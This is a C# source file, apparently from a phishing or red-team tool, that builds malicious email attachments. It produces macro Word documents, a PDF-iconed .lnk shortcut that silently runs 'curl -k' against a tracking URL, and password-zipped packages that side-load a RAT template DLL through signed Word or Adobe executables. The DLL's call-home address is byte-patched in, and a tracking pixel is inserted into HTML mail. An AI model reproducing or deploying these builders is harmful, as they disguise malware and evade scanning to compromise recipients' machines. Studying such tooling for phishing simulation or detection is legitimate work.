using Ionic.Zip;
using IWshRuntimeLibrary;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Kaburra
{
    internal class Attachment
    {
        public string ProcessAttachment(int selectedIndex, string attName, string trackingURL)
        {
            //trường hợp tên attachment có khoảng trắng, thay thế bằng dấu _
            attName = attName.Replace(" ", "_");
            //xử lý và ghi ra folder Temp\file name. Trả về fullpath file
            switch(selectedIndex)
            {
                case 0:
                    {
                        // docx macros
                        attName += @".doc";
                        return CreateDocAttachment(attName, trackingURL);
                        break;
                    }
                case 1:
                    {
                        //lnk shortcut with PDF Icon
                        attName += @".lnk";
                        string sRes = CreatePDFLNKAtt(attName, trackingURL);
                        if(!string.IsNullOrEmpty(sRes))
                        {
                            string zipFile = sRes.Replace(".lnk", ".zip");
                            if(ZipWithPasswd(zipFile, new string[] { sRes }, Marker.defaultZipPasswd))
                            {
                                return zipFile;
                            }
                        }
                        break;
                    }
                case 2:
                    {
                        //MsWord DLL Side-Loading
                        attName += @".exe";
                        string sRed = CreateWordSideLoad(attName, trackingURL);
                        return sRed;
                        break;
                    }
                case 3:
                    {
                        //Adobe PDF DLL Side-Loading
                        attName += @".exe";
                        string sRed = CreatePDFSideLoad(attName, trackingURL);
                        return sRed;
                        break;
                    }
                default:
                    {
                        break;
                    }
            }
            return String.Empty;
        }

        public string GetExt(int selectedIndex)
        {
            switch (selectedIndex)
            {
                case 0:
                    {
                        // docx macros
                        return @".doc";
                        break;
                    }
                case 1:
                    {
                        //lnk shortcut with PDF Icon
                        return @".lnk";
                        break;
                    }
                case 2:
                    {
                        //MsWord DLL Side-Loading
                        return @".exe";
                        break;
                    }
                case 3:
                    {
                        //Adobe PDF DLL Side-Loading
                        return @".exe";
                        break;
                    }
                default:
                    {
                        break;
                    }
            }
            return String.Empty;
        }

        public string GetAttDescr(int selectedIndex)
        {
            switch (selectedIndex)
            {
                case 0:
                    {
                        // docx macros
                        return @"MS Doc File";
                        break;
                    }
                case 1:
                    {
                        //lnk shortcut with PDF Icon
                        return @"PDF LNK Shortcut";
                        break;
                    }
                case 2:
                    {
                        //MsWord DLL Side-Loading
                        return @"MSWord Exe Side-Loading";
                        break;
                    }
                case 3:
                    {
                        //Adobe PDF DLL Side-Loading
                        return @"Adobe Exe Side-Loading";
                        break;
                    }
                default:
                    {
                        break;
                    }
            }
            return String.Empty;
        }
        public string InsertTrackngImg(string inputHTML, string trackURL)
        {
            int bodyIndex = inputHTML.LastIndexOf(@"</body>", StringComparison.OrdinalIgnoreCase);
            if (bodyIndex == -1)
            {
                //File không có body tag
                Form1.Instance.Logging("Error:", "No </BODY> tag in data");
                return string.Empty;
            }
            return inputHTML.Insert(bodyIndex, "<img src=\"" + trackURL + "\" width=\"5\" height=\"5\">" + System.Environment.NewLine);
        }

        string CreateDocAttachment(string attName, string trackingURL)
        {
            string strRes = Directory.GetCurrentDirectory() + @"\Temp\" + attName;
            VBAPL vBAPL = new();
            //copy template qua .\Temp\attchment_name.docx
            //lấy file word\document.xml trong template qua folder .\Temp\word\document.xml
            string tmp = vBAPL.PrepareNewPayload(attName); //tmp là path tới file .\Temp\word\document.xml
            if(string.IsNullOrEmpty(tmp))
            {
                return string.Empty;
            }
            string[] fileContentOrig = System.IO.File.ReadAllLines(tmp);
            bool bRes = vBAPL.UpdateTrackingURL(fileContentOrig, trackingURL);//update nội dung file .\Temp\word\document.xml với trackingURL mới
            if(!bRes)
            {
                return string.Empty;
            }
            bRes =  vBAPL.UpdateDocxFile(attName);
            if (!bRes)
            {
                return string.Empty;
            }
            return strRes;
        }
        string CreatePDFLNKAtt(string attName, string trackingURL)
        {
            //%comspec% /c "DorkFile or command. Or: curl -k trackingURL"
            attName = Directory.GetCurrentDirectory() + @"\Temp\" + attName;
            //ICON PDF = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe,13"
            if (CreateNewLNK(attName, "%comspec%", @"/c curl -k " + trackingURL, @"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe,13")) //dùng curl -k để bỏ qua các error với ssl cert
            {
                return attName;
            }
            return string.Empty;
        }
        bool CreateNewLNK(string strFile, string strTargetPath, string strArguments, string iconLocation)
        {
            // Create a WshShell object
            WshShell shell = new WshShell();
            try
            {
                // Load the shortcut
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(strFile);
                shortcut.IconLocation = iconLocation;
                shortcut.TargetPath = strTargetPath;
                shortcut.Arguments = strArguments;
                //1 Activates and displays a window.If the window is minimized or maximized, the system restores it to its original size and position.
                //3 Activates the window and displays it as a maximized window.
                //7 Minimizes the window and activates the next top-level window.
                shortcut.WindowStyle = 7;
                // Save the changes
                shortcut.Save();
            }
            catch (Exception ex)
            {
                Form1.Instance.Logging("Error:", ex.Message);
                return false;
            }
            return true;
        }

        string CreateWordSideLoad(string attName, string trackingURL)
        {
            //create Word hijack and zip with password
            // tracking domain không chứa tiền tố https://, mục đích để ghi vào raw byte trong DLL, sử dụng cho WINHTTP
            trackingURL = trackingURL.Replace(@"https://", string.Empty);
            string exeFile = @".\Temp\" + attName;
            string dllFile = @".\Temp\" + Marker.wordSideLoadDLL;
            try
            {
                System.IO.File.Copy(@".\Template\" + Marker.ratPETemplate, dllFile, overwrite: true);
                System.IO.File.Copy(@".\Template\" + Marker.wordPE, exeFile, overwrite: true); //Digital Signed + MS WORD Icon EXE file
            }
            catch(Exception ex)
            {
                Form1.Instance.Logging("Error:", $"An error occurred: {ex.Message}");
                return string.Empty;
            }
            bool bRes = ReplaceURL(@".\Temp\" + Marker.wordSideLoadDLL, trackingURL);
            if(bRes)
            {
                string strRes = Directory.GetCurrentDirectory() + @"\Temp\" + attName.Replace(".exe", ".zip");//replace exec ext to zip ext
                bRes = ZipWithPasswd(strRes, new string[] { exeFile, dllFile }, Marker.defaultZipPasswd);
                if(bRes)
                {
                    return strRes;
                }
            }
            return string.Empty;
        }
        string CreatePDFSideLoad(string attName, string trackingURL)
        {
            //create Adobe PDF hijack and zip with password
            // tracking domain không chứa tiền tố https://, mục đích để ghi vào raw byte trong DLL, sử dụng cho WINHTTP
            trackingURL = trackingURL.Replace(@"https://", string.Empty);
            string exeFile = @".\Temp\" + attName;
            string dllFile = @".\Temp\" + Marker.pdfSideLoad;
            try
            {
                System.IO.File.Copy(@".\Template\" + Marker.ratPETemplate, dllFile, overwrite: true);
                System.IO.File.Copy(@".\Template\" + Marker.pdfPE, exeFile, overwrite: true); //Digital Signed + PDF Icon EXE file
            }
            catch (Exception ex)
            {
                Form1.Instance.Logging("Error:", $"An error occurred: {ex.Message}");
                return string.Empty;
            }
            bool bRes = ReplaceURL(@".\Temp\" + Marker.pdfSideLoad, trackingURL);
            if (bRes)
            {
                string strRes = Directory.GetCurrentDirectory() + @"\Temp\" + attName.Replace(".exe", ".zip");//replace exec ext to zip ext
                bRes = ZipWithPasswd(strRes, new string[] { exeFile, dllFile }, Marker.defaultZipPasswd);
                if (bRes)
                {
                    return strRes;
                }
            }
            return string.Empty;
        }
        bool ZipWithPasswd(string zipFile, string[] filesToZip, string passwd)
        {
            try
            {
                using (ZipFile zip = new ZipFile())
                {
                    zip.Password = passwd;
                    foreach (var file in filesToZip)
                    {
                        if (System.IO.File.Exists(file))
                        {
                            zip.AddFile(file, ""); // Add file to the root of the ZIP
                        }
                        else
                        {
                            Form1.Instance.Logging("Error:", $"File not found: {file}");
                            return false;
                        }
                    }
                    zip.Save(zipFile);
                }
                return true;
            }
            catch (Exception ex)
            {
                Form1.Instance.Logging("Error:", $"An error occurred: {ex.Message}");
            }
            return false;
        }

        bool ReplaceURL(string filePath, string trackingURL)
        {
            byte[] searchBytes = Encoding.ASCII.GetBytes(Marker.sparrURLMark);
            List<byte> ovwList = Encoding.ASCII.GetBytes(trackingURL).ToList();
            ovwList.AddRange(new byte[] { 0x00, 0x00, 0x00, 0x00 }); //dùng để ngắt string ASCII
            byte[] overwriteBytes = ovwList.ToArray();
            try
            {
                using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite))
                {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    long offset = 0;
                    while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        // Search for the byte string in the buffer
                        for (int i = 0; i <= bytesRead - searchBytes.Length; i++)
                        {
                            if (IsMatch(buffer, searchBytes, i))
                            {
                                // Found the string, now overwrite from this offset
                                fs.Seek(offset + i, SeekOrigin.Begin);
                                fs.Write(overwriteBytes, 0, overwriteBytes.Length);
                                return true;
                            }
                        }
                        offset += bytesRead;
                    }
                }
                //
            }
            catch (Exception ex)
            {
                Form1.Instance.Logging("Error:", $"An error occurred: {ex.Message}");
            }
            return false;
        }

        bool IsMatch(byte[] buffer, byte[] searchBytes, int startIndex)
        {
            for (int j = 0; j < searchBytes.Length; j++)
            {
                if (buffer[startIndex + j] != searchBytes[j])
                {
                    return false;
                }
            }
            return true;
        }

        public void ClearTemp()
        {
            string directoryPath = @".\Temp\";

            try
            {
                if (Directory.Exists(directoryPath))
                {
                    foreach (var file in Directory.GetFiles(directoryPath))
                    {
                        System.IO.File.Delete(file);
                    }

                    foreach (var directory in Directory.GetDirectories(directoryPath))
                    {
                        Directory.Delete(directory, true); // true to delete recursively
                    }
                }
            }
            catch (Exception ex)
            {
               Form1.Instance.Logging("Error:", $"Clear Temp! An error occurred: {ex.Message}");
            }
        }
    }
}
